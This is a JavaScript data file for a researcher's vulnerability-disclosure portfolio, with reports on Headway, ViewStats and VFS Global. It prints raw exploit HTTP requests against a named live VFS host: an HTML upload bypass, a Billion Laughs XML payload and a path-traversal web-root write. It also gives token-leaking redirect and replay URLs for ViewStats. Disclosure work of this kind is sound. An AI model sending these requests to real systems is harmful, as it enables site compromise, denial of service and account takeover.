/* =========================================================================
   SECURITY RESEARCH — REPORT DATA
   =========================================================================

   This file holds ALL vulnerability reports shown in the Security section.
   The UI (src/security.js) is fully data-driven, so to add a new report you
   ONLY need to add a new object to the `securityReports` array below.

   -------------------------------------------------------------------------
   HOW TO ADD A NEW REPORT
   -------------------------------------------------------------------------
   Copy the TEMPLATE object at the bottom of this file, paste it into the
   `securityReports` array, and fill in the fields. Every section is OPTIONAL
   except `id`, `title`, `target`, and `severity` — the UI renders only the
   blocks you provide, so a minimal report is perfectly valid.

   Severity values (controls badge colour): 'critical' | 'high' | 'medium'
   | 'low' | 'info'

   Status values (controls status chip):    'resolved' | 'patched'
   | 'reported' | 'disclosed' | 'in-progress'
   ========================================================================= */

export const SEVERITY_ORDER = ['critical', 'high', 'medium', 'low', 'info'];

/* ---- Reusable sub-data for the Headway report ---- */
const headwayEmailTimeline = [
  { date: 'Jun 9, 2026', sender: 'Paul Uhunoma', direction: 'sent', summary: 'Initial responsible disclosure email sent to Headway security team, requesting a secure channel to share vulnerability details.' },
  { date: 'Jun 9, 2026', sender: 'Angie — Head of HW Care', direction: 'received', summary: 'Angie responded promptly, requesting full vulnerability details for the IT team to review.' },
  { date: 'Jun 9, 2026', sender: 'Paul Uhunoma', direction: 'sent', summary: 'Sent the complete Security Vulnerability Report with full technical details, step-by-step PoC, and a proof-of-concept video demonstrating the exploit on hwsoc.com.' },
  { date: 'Jun 10, 2026', sender: 'Angie — Head of HW Care', direction: 'received', summary: 'Confirmed the report was forwarded to the IT department for review.' },
  { date: 'Jun 11, 2026', sender: 'Angie — Head of HW Care', direction: 'received', summary: 'IT team reviewed the report and confirmed changes will be implemented. Offered a $50 reward for the responsible disclosure.' },
  { date: 'Jun 11, 2026', sender: 'Paul Uhunoma', direction: 'sent', summary: 'Accepted the reward and provided bank details. Offered to perform a complimentary re-test once the patch is deployed.' },
  { date: 'Jun 11, 2026', sender: 'Angie — Head of HW Care', direction: 'received', summary: 'Reward of $50 credited to Headway USD wallet for withdrawal. Fast and convenient resolution.' },
  { date: 'Jun 12, 2026', sender: 'Angie — Head of HW Care', direction: 'received', summary: 'Final thank-you and positive close to the responsible disclosure process.' },
];

const headwayScreenshots = [
  { src: '/headway-email-1.png', caption: 'Initial disclosure email to Headway' },
  { src: '/headway-email-2.png', caption: 'Response from Angie — requesting details' },
  { src: '/headway-email-3.png', caption: 'Full vulnerability report sent' },
  { src: '/headway-email-4.png', caption: 'Report forwarded to IT team' },
  { src: '/headway-email-5.png', caption: 'IT review complete — reward offered' },
  { src: '/headway-email-6.png', caption: 'Reward acceptance & bank details' },
  { src: '/headway-email-7.png', caption: 'Reward credited to wallet' },
  { src: '/headway-email-8.png', caption: 'Withdrawal confirmed & re-test offered' },
  { src: '/headway-9.png', caption: 'Final thank-you from Headway' },
];

const headwayAttackSteps = [
  { step: 1, title: 'Craft Malicious URL', icon: '🔗', desc: 'Attacker nests an external domain inside the OAuth redirect parameter, bypassing domain validation.' },
  { step: 2, title: 'Victim Clicks Link', icon: '🎯', desc: 'Logged-in user navigates to the crafted URL. The backend appends the user\'s live session token (socialToken) to the redirect.' },
  { step: 3, title: 'Token Leaked', icon: '🔓', desc: 'User is redirected to the attacker\'s domain with their active socialToken exposed in the URL.' },
  { step: 4, title: 'Account Takeover', icon: '💀', desc: 'Attacker uses the stolen socialToken to log into the victim\'s account — full access without credentials.' },
];

/* ---- Reusable sub-data for the VFS Global report ---- */
const vfsVulnerabilities = [
  {
    title: 'Unrestricted File Upload via Content-Type Bypass',
    severity: 'HIGH',
    desc: 'The upload endpoint accepts files with any Content-Type header. By changing Content-Type to text/html, an attacker can upload malicious HTML files that are served directly by the server. These files can be used to host phishing pages, steal user credentials, or execute JavaScript in the context of the trusted domain.',
    endpoint: '/CustomerFeedback/GeneralFeedback/UploadFiles/',
    proof: 'Uploaded hacked1.html was accessible at: /CustomerFeedback/uploads/hacked1.html',
    code: `POST /CustomerFeedback/GeneralFeedback/UploadFiles/ HTTP/2
Host: www.vfsglobalcustomerexperience.com
Cookie: .AspNetCore.Antiforgery.cFTIh2oyc2M=CfDJ8JtYBXj_...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1sybpdBdHJt2iBml
X-Requested-With: XMLHttpRequest

------WebKitFormBoundary1sybpdBdHJt2iBml
Content-Disposition: form-data; name="files"; filename="hacked1.html"
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
</head>
<body>
    paul
    <script>
        const myIframe = document.createElement('iframe');
        myIframe.src = './hacked1.html';
        myIframe.width = '100%';
        myIframe.height = '600px';
        myIframe.sandbox = 'allow-scripts allow-same-origin';
        document.body.appendChild(myIframe);
    </script>
</body>
</html>
------WebKitFormBoundary1sybpdBdHJt2iBml--

HTTP/2 200 OK

[{"fileName":"","filePath":"/upload/hacked1.html","fileType":".html","size":245}]`,
  },
  {
    title: 'XML Billion Laughs (DoS via Entity Expansion)',
    severity: 'HIGH',
    desc: 'The upload endpoint also accepts XML files without restricting external entity processing. An attacker can craft a Billion Laughs payload (recursive entity expansion) which causes the XML parser to consume exponential memory and CPU, potentially crashing the server or causing a Denial-of-Service condition.',
    endpoint: '/CustomerFeedback/GeneralFeedback/UploadFiles/',
    proof: 'Uploaded test.xml with entity expansion — server parsed and expanded all entities, confirming vulnerability.',
    code: `POST /CustomerFeedback/GeneralFeedback/UploadFiles/ HTTP/2
Host: www.vfsglobalcustomerexperience.com
Cookie: .AspNetCore.Antiforgery.cFTIh2oyc2M=CfDJ8JtYBXj_...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1sybpdBdHJt2iBml
X-Requested-With: XMLHttpRequest

------WebKitFormBoundary1sybpdBdHJt2iBml
Content-Disposition: form-data; name="files"; filename="test.xml"
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE bomb [
  <!ENTITY a "AAAAAAAAAA">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
]>
<test>&b;</test>
------WebKitFormBoundary1sybpdBdHJt2iBml--

HTTP/2 200 OK

[{"fileName":"","filePath":"/upload/test.xml","fileType":".xml","size":245}]

// Parsed output confirms entity expansion:
// <test>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</test>`,
  },
  {
    title: 'Path Traversal — File Write to Web Root',
    severity: 'CRITICAL',
    desc: 'By manipulating the filename with path traversal sequences (..\\..\\..\\inetpub\\wwwroot\\), an attacker can write files to the site\'s root directory. This allows placing arbitrary HTML/JS files at any URL on the domain, enabling full site defacement, persistent XSS, or hosting malicious content under the trusted domain.',
    endpoint: '/CustomerFeedback/GeneralFeedback/UploadFiles/',
    proof: 'Uploaded pathhack.html was accessible at the site root: /CustomerFeedback/pathhack.html',
    code: `POST /CustomerFeedback/GeneralFeedback/UploadFiles/ HTTP/2
Host: www.vfsglobalcustomerexperience.com
Cookie: .AspNetCore.Antiforgery.cFTIh2oyc2M=CfDJ8JtYBXj_...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1sybpdBdHJt2iBml
X-Requested-With: XMLHttpRequest

------WebKitFormBoundary1sybpdBdHJt2iBml
Content-Disposition: form-data; name="files"; filename="..\\..\\..\\inetpub\\wwwroot\\pathhack.html"
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
</head>
<body>
    paul
    <script>
        const myIframe = document.createElement('iframe');
        myIframe.src = './hacked1.html';
        myIframe.width = '100%';
        myIframe.height = '600px';
        myIframe.sandbox = 'allow-scripts allow-same-origin';
        document.body.appendChild(myIframe);
    </script>
</body>
</html>
------WebKitFormBoundary1sybpdBdHJt2iBml--

HTTP/2 200 OK

[{"fileName":"","filePath":"/pathhack.html","fileType":".html","size":245}]

// File accessible at: https://www.vfsglobalcustomerexperience.com/CustomerFeedback/pathhack.html`,
  },
];

/* =========================================================================
   THE REPORTS ARRAY — add new reports here
   ========================================================================= */
export const securityReports = [
  /* ----------------------------- HEADWAY ----------------------------- */
  {
    id: 'headway',
    title: 'Open Redirect Account Takeover',
    target: 'Headway',
    icon: '/headwayfavicon.svg',
    severity: 'critical',
    status: 'resolved',
    tagline: 'ATO via OAuth token leakage — $50 bounty awarded.',
    meta: [
      { label: 'Vulnerability Type', value: 'Account Takeover (ATO) via OAuth Token Leakage' },
      { label: 'Affected Domains', value: 'hwsoc.com & hw.online', code: false },
      { label: 'Target Endpoint', value: '/api/auth/v1/redirect-to-social-oauth', code: true },
      { label: 'Outcome', value: 'Bug acknowledged · Patch implemented · $50 bounty awarded', success: true },
    ],
    attackSteps: headwayAttackSteps,
    impact: [
      { icon: '🔐', title: 'Full Account Compromise', desc: 'An attacker can completely take over any Headway user account via a single crafted link — no credentials required.' },
      { icon: '👤', title: 'Personal Data Exposure', desc: "Full access to the victim's trading profile, personal data, and all account functions." },
      { icon: '⚡', title: 'Zero-Click After Auth', desc: 'Once the victim clicks the link and authenticates with Google, the token is leaked automatically.' },
    ],
    timeline: headwayEmailTimeline,
    videos: [
      { badge: 'Submitted to Headway', badgeClass: 'reported', title: 'hwsoc.com — Original Vulnerability Report', description: 'This is the original PoC video demonstrating the Open Redirect Account Takeover on hwsoc.com. Attached to the initial disclosure on June 9, 2026.', videoSrc: '/headway-vulnerability.mp4' },
      { badge: 'Discovered After Bounty', badgeClass: 'discovered', title: 'hw.online — Same Vulnerability, Different Domain', description: 'After receiving the $50 bounty, I discovered the same vulnerability on hw.online, confirming the endpoint was shared across multiple Headway properties.', videoSrc: '/headway-final-vulnerability.mp4', extraClass: 'additional-finding' },
    ],
    screenshots: headwayScreenshots,
  },

  /* ---------------------- VIEWSTATS / MRBEAST ----------------------- */
  {
    id: 'viewstats-mrbeast',
    title: 'OAuth Token Leakage Account Takeover',
    target: 'ViewStats (MrBeast)',
    icon: '/mrbeast-logo.svg',
    featured: true,
    severity: 'critical',
    status: 'reported',
    tagline: 'Critical ATO through an unvalidated login redirectUri parameter.',
    meta: [
      { label: 'Vulnerability Type', value: 'Open Redirect leading to Account Takeover via OAuth token leakage' },
      { label: 'Affected Product', value: 'ViewStats login flow', code: false },
      { label: 'Vulnerable Parameter', value: 'redirectUri', code: true },
      { label: 'Disclosure Status', value: 'Privately reported · Engineering review in progress' },
    ],
    attackSteps: [
      { step: 1, title: 'Craft Login URL', icon: '🔗', desc: 'The attacker places an external, attacker-controlled URL in the unvalidated redirectUri parameter.' },
      { step: 2, title: 'Victim Authenticates', icon: '🎯', desc: 'The victim sees the legitimate ViewStats login page and completes the normal authentication flow.' },
      { step: 3, title: 'Token Redirected', icon: '🔓', desc: 'ViewStats redirects the victim externally and appends the sensitive access_token to the attacker URL.' },
      { step: 4, title: 'Token Captured', icon: '📥', desc: 'The attacker retrieves the victim token from request logs on the attacker-controlled server.' },
      { step: 5, title: 'Session Hijacked', icon: '🕵️', desc: 'The stolen access token is passed back to ViewStats to assume the victim’s authenticated session.' },
      { step: 6, title: 'Account Takeover', icon: '💀', desc: 'The attacker gains unauthorized access to the ViewStats account and connected YouTube analytics.' },
    ],
    vulnerabilities: [
      {
        title: 'Unvalidated redirectUri Leaks OAuth Access Token',
        severity: 'CRITICAL',
        desc: 'The ViewStats login endpoint accepts an external redirectUri without validating it against trusted destinations. After successful authentication, the application redirects the user to that external location with the active access_token in the URL, allowing an attacker to capture the token and take over the account.',
        endpoint: 'https://www.viewstats.com/login?redirectUri=<attacker-controlled-url>',
        proof: 'The captured access token can be supplied to viewstats.com to create a fully authenticated session as the victim.',
        code: `# 1. Crafted link sent to the victim
https://www.viewstats.com/login?redirectUri=https%3A%2F%2Fwww.example.com%2F

# 2. Redirect after the victim authenticates
https://example.com/?access_token=<victim_access_token>

# 3. Stolen token replayed against ViewStats
https://viewstats.com/?access_token=<victim_access_token>`,
      },
    ],
    impact: [
      { icon: '🔐', title: 'Complete Account Takeover', desc: 'A captured access token lets the attacker authenticate as the victim without knowing their credentials.' },
      { icon: '▶️', title: 'YouTube Data Exposure', desc: 'The compromised account may expose connected YouTube channel information, performance data, and analytics.' },
      { icon: '🎭', title: 'Trusted Login Experience', desc: 'The malicious link initially displays the legitimate ViewStats login page, making the attack difficult for a victim to recognize.' },
    ],
    remediation: [
      'Validate redirectUri against a hardcoded allowlist of trusted origins and approved internal paths.',
      'Reject absolute external URLs, scheme-relative URLs, encoded bypasses, and malformed redirect destinations.',
      'Never place access tokens in URLs; use secure, short-lived authorization codes and server-side token exchange.',
      'Invalidate any access tokens that may have been exposed and review authentication logs for suspicious redirects.',
    ],
    videos: [
      {
        badge: 'Private Disclosure PoC',
        badgeClass: 'reported',
        title: 'ViewStats — Open Redirect to Account Takeover',
        description: 'Proof-of-concept recording showing how the redirectUri payload is crafted, how the access token is leaked to an external destination, and how the stolen token can be replayed to hijack the victim’s ViewStats session.',
        videoSrc: '/viewstats-mrbeast-vulnerability.mp4',
        thumbnailTime: 3,
      },
    ],
  },

  /* ---------------------------- VFS GLOBAL --------------------------- */
  {
    id: 'vfsglobal',
    title: 'Multiple Critical Upload Vulnerabilities',
    target: 'VFS Global',
    icon: '/vfs.ico',
    severity: 'critical',
    status: 'reported',
    tagline: '3 distinct file-upload flaws on a global visa platform.',
    meta: [
      { label: 'Target', value: 'vfsglobalcustomerexperience.com', code: true },
      { label: 'Vulnerable Endpoint', value: '/CustomerFeedback/GeneralFeedback/UploadFiles/', code: true },
      { label: 'Vulnerabilities Found', value: '3 distinct vulnerabilities in the file upload functionality' },
      { label: 'Platform', value: 'ASP.NET Core on IIS (Windows Server)' },
    ],
    vulnerabilities: vfsVulnerabilities,
    impact: [
      { icon: '📄', title: 'Arbitrary File Upload', desc: 'Attacker can upload malicious HTML/JS files to the server by bypassing Content-Type validation, hosting phishing pages on the trusted domain.' },
      { icon: '💣', title: 'Denial of Service', desc: 'XML Billion Laughs payload causes exponential memory consumption, potentially crashing the server or degrading service for all users.' },
      { icon: '🗂️', title: 'Web Root Write Access', desc: 'Path traversal allows writing files to the IIS web root, enabling site defacement, persistent XSS, or malware hosting under a trusted domain.' },
    ],
    videos: [
      { badge: 'Vulnerability Demonstration', badgeClass: 'reported', title: 'VFS Global — Upload Vulnerabilities PoC', description: 'Demonstration of the Content-Type bypass, XML entity expansion, and path traversal vulnerabilities on vfsglobalcustomerexperience.com.', videoSrc: '/vfsglobal.mp4' },
    ],
  },

  /* =======================================================================
     TEMPLATE — copy this object to add a NEW report, then delete this
     comment wrapper. Remove any sections you don't need; only `id`, `title`,
     `target` and `severity` are required.
     =======================================================================
  {
    id: 'unique-slug',                 // unique id (used internally)
    title: 'Short Vulnerability Title',
    target: 'Company / Product',
    icon: '/favicon.svg',              // optional image in /public (falls back to initials)
    severity: 'high',                  // critical | high | medium | low | info
    status: 'reported',                // resolved | patched | reported | disclosed | in-progress
    tagline: 'One-line summary shown on the card.',

    // Optional: key/value facts shown at the top of the detail view
    meta: [
      { label: 'Vulnerability Type', value: 'e.g. Stored XSS' },
      { label: 'Target Endpoint', value: '/api/endpoint', code: true },
      { label: 'Outcome', value: 'Fixed & rewarded', success: true },
    ],

    // Optional: step-by-step attack flow cards
    attackSteps: [
      { step: 1, title: 'Step title', icon: '🔗', desc: 'What the attacker does.' },
    ],

    // Optional: list of individual findings (each can have exploit code)
    vulnerabilities: [
      {
        title: 'Finding title',
        severity: 'HIGH',              // CRITICAL | HIGH | MEDIUM | LOW | INFO
        desc: 'Description of the finding.',
        endpoint: '/vulnerable/path',
        proof: 'Evidence of exploitation.',
        code: 'raw request / exploit code (optional)',
      },
    ],

    // Optional: impact summary cards
    impact: [
      { icon: '🔐', title: 'Impact title', desc: 'Why it matters.' },
    ],

    // Optional: recommended fixes shown in a collapsible panel
    remediation: [
      'Describe a concrete remediation step.',
    ],

    // Optional: responsible-disclosure email timeline
    timeline: [
      { date: 'Jan 1, 2026', sender: 'You', direction: 'sent', summary: 'What happened.' },
    ],

    // Optional: proof-of-concept videos (files live in /public)
    videos: [
      { badge: 'PoC', badgeClass: 'reported', title: 'Video title', description: 'What it shows.', videoSrc: '/video.mp4' },
    ],

    // Optional: screenshot gallery (lightbox-enabled)
    screenshots: [
      { src: '/screenshot.png', caption: 'Caption' },
    ],
  },
  ======================================================================= */
];

export default securityReports;
